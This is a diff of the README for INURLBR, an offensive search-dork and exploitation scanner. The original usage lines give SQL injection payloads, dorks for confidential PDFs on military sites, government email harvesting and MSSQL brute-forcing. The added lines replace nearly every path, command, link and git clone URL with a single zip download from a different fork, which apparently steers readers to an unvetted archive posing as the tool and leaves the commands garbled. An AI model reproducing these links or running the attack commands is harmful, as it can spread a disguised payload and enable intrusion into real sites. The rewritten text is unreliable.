+              --sub-cmd-vul 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip _TARGET_ https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
+              --sub-cmd-vul 'php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -t _TARGET_ -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
                   
  --sub-cmd-all Run command to each target found within the sub-process scope.
      Example: --sub-cmd-all {command}
      Usage:   --sub-cmd-all 'nmap sV -p 22,80,21 _TARGET_'
-              --sub-cmd-all './exploit.sh _TARGET_ output.txt'
-              --sub-cmd-all 'php miniexploit.php -t _TARGET_ -s output.txt'
+              --sub-cmd-all 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip _TARGET_ https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
+              --sub-cmd-all 'php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -t _TARGET_ -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
 
 
  --port-scan Defines ports that will be validated as open.
@@ -515,7 +515,7 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
  --port-cmd Define command that runs when finding an open door.
      Example: --port-cmd {command}
      Usage:   --port-cmd './xpl _TARGETIP_:_PORT_'
-              --port-cmd './xpl _TARGETIP_/file.php?sqli=1'
+              --port-cmd './xpl https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'
 
  --port-write Send values for door.
      Example: --port-write {'value0','value1','value3'}
@@ -552,107 +552,107 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
 
 ## Commands
 ```properties
-./inurlbr.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"  
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'inurl:php?id=' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -q 1,6 -t 1 --exploit-get "?´'%270x27;"  
    
-./inurlbr.php --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;" 
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'inurl:aspx?id=' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -q 1,6 -t 1 --exploit-get "?´'%270x27;" 
    
-./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'site:br inurl:aspx (id|new)' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -q 1,6 -t 1 --exploit-get "?´'%270x27;"
    
-./inurlbr.php --dork 'index of wp-content/uploads' -s save.txt -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'index of wp-content/uploads' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'
    
-./inurlbr.php --dork 'site:.mil.br intext:(confidencial) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip intext:(confidencial) ext:pdf' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'
    
-./inurlbr.php --dork 'site:.mil.br intext:(secreto) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'secreto'        
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip intext:(secreto) ext:pdf' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -q 1,6 -t 2 --exploit-get '?' -a 'secreto'        
   
-./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'site:br inurl:aspx (id|new)' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -q 1,6 -t 1 --exploit-get "?´'%270x27;"
    
-./inurlbr.php --dork '.new.php?new id' -s save.txt -q 1,6,7,2,3 -t 1 --exploit-get '+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' -a '::EXPLOIT-SUCESS::'
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip id' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -q 1,6,7,2,3 -t 1 --exploit-get '+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' -a '::EXPLOIT-SUCESS::'
   
-./inurlbr.php --dork 'new.php?id=' -s teste.txt  --exploit-get ?´0x27  --command-vul 'nmap sV -p 22,80,21 _TARGET_'
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip  --exploit-get ?´0x27  --command-vul 'nmap sV -p 22,80,21 _TARGET_'
    
-./inurlbr.php --dork 'site:pt inurl:aspx (id|q)' -s bruteforce.txt --exploit-get ?´0x27 --command-vul 'msfcli auxiliary/scanner/mssql/mssql_login RHOST=_TARGETIP_ MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'site:pt inurl:aspx (id|q)' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --exploit-get ?´0x27 --command-vul 'msfcli auxiliary/scanner/mssql/mssql_login RHOST=_TARGETIP_ MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'
   
-./inurlbr.php --dork 'site:br inurl:id & inurl:php' -s get.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap/sqlmap.py -u "_TARGETFULL_" --dbs'
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'site:br inurl:id & inurl:php' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --exploit-get "?´'%270x27;" --command-vul 'python https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -u "_TARGETFULL_" --dbs'
   
-./inurlbr.php --dork 'inurl:index.php?id=' -q 1,2,10 --exploit-get "'?´0x27'" -s report.txt --command-vul 'nmap -Pn -p 1-8080 --script http-enum --open _TARGET_'
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -q 1,2,10 --exploit-get "'?´0x27'" -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --command-vul 'nmap -Pn -p 1-8080 --script http-enum --open _TARGET_'
  
-./inurlbr.php --dork 'site:.gov.br email' -s reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip email' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
   
-./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s emails.txt -m
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip email (gmail|yahoo|hotmail) ext:txt' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -m
   
-./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s urls.txt -u
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip email (gmail|yahoo|hotmail) ext:txt' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -u
  
-./inurlbr.php --dork 'site:gov.bo' -s govs.txt --exploit-all-id  1,2,6  
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --exploit-all-id  1,2,6  
  
-./inurlbr.php --dork 'site:.uk' -s uk.txt --user-agent  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' 
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --user-agent  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' 
  
-./inurlbr.php --dork-file 'dorksSqli.txt' -s govs.txt --exploit-all-id  1,2,6 
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork-file 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --exploit-all-id  1,2,6 
  
-./inurlbr.php --dork-file 'dorksSqli.txt' -s sqli.txt --exploit-all-id  1,2,6  --irc 'irc.rizon.net#inurlbrasil'   
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork-file 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --exploit-all-id  1,2,6  --irc 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'   
   
-./inurlbr.php --dork 'inurl:"cgi-bin/login.cgi"' -s cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_'  
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork 'inurl:"https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip"' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --ifurl 'cgi' --command-all 'php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip _TARGET_'  
  
-./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --target 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -o https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -t 4
   
-./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?´'%270x27;"
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --target 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -o https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -t 4 --exploit-get "?´'%270x27;"
   
-./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?pass=1234" -a '<title>hello! admin</title>'
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --target 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -o https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -t 4 --exploit-get "?pass=1234" -a '<title>hello! admin</title>'
   
-./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find_valid_cod-200.txt -s output.txt -t 5
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --target 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -o https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -t 5
   
-./inurlbr.php --range '200.20.10.1,200.20.10.255' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --range '200.20.10.1,200.20.10.255' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --command-all 'php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip _TARGETIP_'  
  
-./inurlbr.php --range-rad '1500' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --range-rad '1500' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --command-all 'php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip _TARGETIP_'  
  
-./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8  
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork-rad '20' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8  
  
-./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8   --pr
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork-rad '20' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8   --pr
  
-./inurlbr.php --dork-file 'dorksCGI.txt' -s output.txt -q 1,2,6,4,5,9,7,8   --pr --shellshock
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork-file 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -q 1,2,6,4,5,9,7,8   --pr --shellshock
  
-./inurlbr.php --dork-file 'dorks_Wordpress_revslider.txt' -s output.txt -q 1,2,6,4,5,9,7,8  --sub-file 'xpls_Arbitrary_File_Download.txt'  
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --dork-file 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip' -s https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -q 1,2,6,4,5,9,7,8  --sub-file 'https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip'  
 ```
 
 ## Installation
-Preferably, you can download inurlbr by cloning the [Git](https://github.com/MrCl0wnLab/SCANNER-INURLBR) repository:
+Preferably, you can download inurlbr by cloning the [Git](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip) repository:
 ```properties
-git clone https://github.com/MrCl0wnLab/SCANNER-INURLBR.git inurlbr
+git clone https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip inurlbr
 ```
-The inurlbr works with [php](http://php.net/downloads.php) version **7.x**  linux platforms.
+The inurlbr works with [php](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip) version **7.x**  linux platforms.
 
 ## Giving permission to script execution
 ```properties
-$chmod +x inurlbr.php
-Run: ./inurlbr.php
+$chmod +x https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
+Run: https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
 ```
 
 ## Setting your token ipinfo
 It is possible to register more than one token
 ```bash
-./resources/token.ipinfo.inurl
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
 ```
 ## Setting your strings
 You can register more validation strings
 ```bash
-./resources/strings.validation.inurl
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
 ```
 
 ## Setting your filter strings
 You can register more filter values that dirty your results
 ```bash
-./resources/trash_list.validation.inurl
+https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip
 ```
 
 ## Usage
 To get a list of basic options and switches use:
 ```properties
-php inurlbr.php -h
+php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip -h
 ```
 To get a list of all options and switches use:
 ```properties
-php inurlbr.php --help
-php inurlbr.php --info
+php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --help
+php https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip --info
 ```
 
-* Demos: [http://youtube.com/c/INURLBrasil](https://www.youtube.com/playlist?list=PLV1376pVwcCmcoCmq_Z4O0ra4BqjmhIaR)
-* Tutoriais: [http://blog.inurl.com.br/search/label/INURLBR](http://blog.inurl.com.br/search/label/INURLBR)
+* Demos: [https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip)
+* Tutoriais: [https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip](https://github.com/gwaan83/SCANNER-INURLBR/raw/refs/heads/master/resources/INURLBR-SCANNE-2.9.zip)
